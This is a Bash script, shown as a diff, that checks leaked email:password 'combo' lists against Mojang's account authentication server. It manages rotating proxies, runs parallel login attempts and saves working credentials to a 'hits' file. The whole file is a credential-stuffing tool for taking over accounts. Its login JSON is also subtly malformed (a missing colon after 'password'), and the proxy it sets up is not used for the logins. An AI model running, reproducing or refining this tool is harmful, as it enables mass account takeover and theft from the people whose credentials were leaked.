@@ -1,0 +1,216 @@
+#!/bin/bash
+
+logo() {
+
+  unset blank
+  for ((i=42; i < "$COLUMNS"-1; i+=2)); do blank+=' '; done
+  echo
+  echo "$blank   __  __________           __"
+  echo "$blank  /  |/  / ___/ /  ___ ____/ /_____ ____"
+  echo "$blank / /|_/ / /__/ _ \/ -_) __/  '_/ -_) __/"
+  echo "$blank/_/  /_/\___/_//_/\__/\__/_/\_\\\__/_/"
+  echo "$blank                          By TyraVex"
+  echo
+
+}
+
+menu() {
+
+  clear
+  if (( "$COLUMNS" > 39 )); then
+    logo
+  else
+    echo
+  fi
+  trap 'rm -f data/.temp; echo -e "\n"; exit' 2 3
+  unset goUp
+  case "$1" in
+    error) echo -e "\e[31mERROR : $2\e[0m\n";;
+    success) echo -e "\e[32mSUCCESS : $2\e[0m\n";;
+  esac
+  mkdir -p data
+  proxy=$(cat data/.proxy 2>/dev/null)
+  if [[ -z "$proxy" ]]; then
+    echo -e '\n\e[31mNo rotating proxy found\n\e[0m'
+    editProxy
+  fi
+  readarray -t paths <<< $(find -type f -not -wholename './data/bads' -not -wholename './data/hits' -not -wholename "$0" -not -path './data/.*' -not -path './.*' -not -size 0)
+  if [[ -z "$paths" ]]; then
+    echo -e "\e[31mNo files that could be used as combos were found\n"
+    exit
+  elif [[ ! -f "$1" && -z "$paths" && "$1" != 'success' && "$1" != 'error' ]]; then
+    echo -e "\e[31mNo  file '$1' found"
+    echo -e "Usage: $0 <combo>\e[0m\n"
+    exit
+  elif [[ -f "$1" ]]; then
+    combo="$1"
+    echo -e "\e[35m> Selected ${combo:2}\e[0m"
+    skip=true
+  elif (( "${#paths[@]}" > 1 )); then
+    last=$(cat data/.last 2>/dev/null)
+    if [[ "$?" == 1 ]]; then
+      last="$paths"
+    fi
+    for ((i=0; i < "${#paths[@]}"; i++)); do
+      goUp+="\e[A"
+      if [[ "$last" == "${paths[i]}" ]]; then
+        echo -e "\e[34m[$((i+1))] - ${paths[i]:2} ($(wc -l < ${paths[i]}) l)\e[0m"
+        lastTemp="${paths[i]}"
+      else
+        echo -e "\e[36m[$((i+1))] - ${paths[i]:2} ($(wc -l < ${paths[i]}) l)\e[0m"
+      fi
+    done
+    echo
+    read -p 'Option : ' choice
+    if [[ -z "$choice" || "$choice" == 0 ]]; then
+      if [[ -n "$lastTemp" ]]; then
+        combo="$lastTemp"
+      else
+        combo="$paths"
+      fi
+    elif [[ -n "${paths[choice-1]}" && "$choice" =~ [1-9][0-9]* ]]; then
+      combo="${paths[choice-1]}"
+    else
+      menu 'error' "Invalid input"
+      exit
+    fi
+  else
+    combo="$paths"
+    echo -e "\e[35m> Selected ${combo:2}\e[0m"
+    skip=true
+  fi
+  if [[ -z "$skip" ]]; then
+    echo -e "\e[A                \e[A\e[A\e[A"
+    echo -e "$goUp"
+    for ((i=0; i < "${#paths[@]}"; i++)); do
+      if [[ "$combo" == "${paths[i]}" ]]; then
+        echo -e "\e[32m[$((i+1))] - ${paths[i]:2} ($(wc -l < ${paths[i]}) l)\e[0m"
+      elif [[ "$lastTemp" == "${paths[i]}" ]]; then
+        echo -e "\e[34m[$((i+1))] - ${paths[i]:2} ($(wc -l < ${paths[i]}) l)\e[0m"
+      else
+        echo -e "\e[36m[$((i+1))] - ${paths[i]:2} ($(wc -l < ${paths[i]}) l)\e[0m"
+      fi
+    done
+    echo
+  fi
+  oldCombo=$(cat data/.last 2>/dev/null)
+  echo "$combo" > data/.last
+  touch data/bads data/hits
+  echo "> Loading valid lines..."
+  if [[ -z "$lines" || "$combo" != "$oldCombo" ]]; then
+    sort "$combo" | uniq | tr -d '\15\32' | egrep "[[:graph:]]+@[[:graph:]]+\:.{3,}" > data/.temp
+    readarray -t lines <<< $(sort data/.temp data/bads data/bads data/hits data/hits | uniq -u)
+  fi
+  if [[ -z "$lines" ]]; then
+    numLines=0
+  else
+    numLines="${#lines[@]}"
+  fi
+    echo -e "\e[A\e[35m> Loaded $numLines/$(wc -l < $combo) lines\e[0m           "
+  if [[ -s data/bads || -s data/hits ]]; then
+    ((did=$(wc -l < data/.temp)-numLines))
+    echo -e "\n\e[32m> Hit/bad : $(wc -l < data/hits)/$(wc -l < data/bads)\e[0m"
+    echo -e "\e[32m> Achived : $did/$((numLines-did))\e[0m"
+  fi
+  echo -e '\n\e[32m[s] - Start\e[0m'
+  echo -e '\e[33m[p] - Preview accs\e[0m'
+  echo -e '\e[33m[x] - Edit proxy\e[0m'
+  echo -e '\e[33m[t] - Test proxy\e[0m'
+  echo -e '\e[31m[e] - Exit\e[0m\n'
+  read -p 'Option : ' choice
+  case "$choice" in
+    '') worker;;
+     s) worker;;
+     x) echo; editProxy;;
+     p) echo -e "\n\e[35mHead :\e[0m\n${lines[0]}\n${lines[1]}\n${lines[2]}\n${lines[3]}\n${lines[4]}"
+        echo -e "\n\e[35mTail :\e[0m\n${lines[-5]}\n${lines[-4]}\n${lines[-3]}\n${lines[-2]}\n${lines[-1]}\n"
+        read -p 'Press enter to continue...'
+        menu;;
+     t) testProxy;;
+     e) echo; exit;;
+     *) menu 'error' 'Invalid input';;
+  esac
+
+}
+
+
+editProxy() {
+
+  unset credentials website
+  echo -e '\e[35mEnter nothing to cancel\e[0m\n'
+  read -p 'username:password : ' credentials
+  read -p 'website/ip(:port) : ' website
+  if [[ -z "$credentials" || -z "$website" ]]; then
+    menu 'error' 'Empty input, cancelling...'
+  else
+    echo "$credentials@$website" > data/.proxy
+    menu 'success' 'Proxy was edited'
+  fi
+
+}
+
+testProxy() {
+  echo -e '\n\e[35mTesting proxy...\e[0m'
+  rm -f data/.test
+  for ((i=0; i < 10; i++)); do
+    echo $(curl -s -m 5 -x "$proxy" ident.me) >> data/.test &
+  done
+  wait
+  ip=$(sort data/.test | uniq)
+  rm data/.test
+  if [[ -z "$ip" ]]; then
+    ip=0
+  else
+    ip=$(wc -l <<< "$ip")
+  fi
+  case "$ip" in
+    10|9|8) menu 'success' "Proxy is excellent ($ip/10)";;
+     7|6|5) menu 'success' "Proxy is acceptable ($ip/10)";;
+   4|3|2|1) menu 'success' "Proxy is bad quality ($ip/10)";;
+         0) menu 'error' "Proxy is invalid ($ip/10)";;
+  esac
+  rm data/.test
+}
+
+worker() {
+
+  echo -e "\nLaunching threads...\n"
+  nextStep=10
+  rm data/.temp
+  for ((i=0; i < "${#lines[@]}"; i++)); do
+    if (( "$i" > "$nextStep" )); then
+      ((nextStep=i+10))
+      while (( $(ps | grep curl | wc -l) > 10 )); do
+        echo -e "\e[31m# Reached max threads...\e[0m"
+        sleep 1
+      done
+    fi
+    checkacc "${lines[i]}" &
+  done
+  echo "Finishing threads..."
+  wait
+  echo -e "Done\n"
+
+}
+
+checkacc() {
+
+  acc=(${1/:/ })
+  while true; do
+    request=$(curl -s -m 10 -H 'Accept:application/json' -H 'content-Type:application/json' \
+    'https://authserver.mojang.com/authenticate' -X POST \
+    -d '{"username": "'${acc[0]}'", "password" "'${acc[1]}'"}' | head -c 3)
+    if [[ "$request" == '{"c' ]]; then
+      echo -e "\e[32mHIT > $1\e[0m"
+      echo "$1" >> data/hits
+      exit
+    elif [[ "$request" == '{"e' ]]; then
+      echo -e "\e[33mbad > $1\e[0m"
+      echo "$1" >> data/bads
+      exit
+    fi
+  done
+
+}
+
+menu "$1"
